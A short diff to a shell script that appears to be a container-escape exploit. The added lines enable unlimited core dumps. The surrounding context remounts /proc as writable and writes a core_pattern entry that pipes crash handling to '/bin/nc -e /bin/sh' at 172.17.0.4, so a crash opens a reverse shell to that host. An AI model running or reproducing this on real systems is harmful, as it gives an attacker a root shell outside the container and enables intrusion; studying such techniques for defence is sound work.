@@ -5,6 +5,12 @@ if [ "$?" == "1" ]; then
     exit 1;
 fi
 
+ulimit -c unlimited
+if [ "$?" == "1" ]; then
+    echo "Couldn't enable core dumping";
+    exit 1;
+fi
+
 echo "Remounted /proc/ as rw";
 echo "|/bin/nc -e /bin/sh 172.17.0.4 9999" > /proc/sys/kernel/core_pattern
 
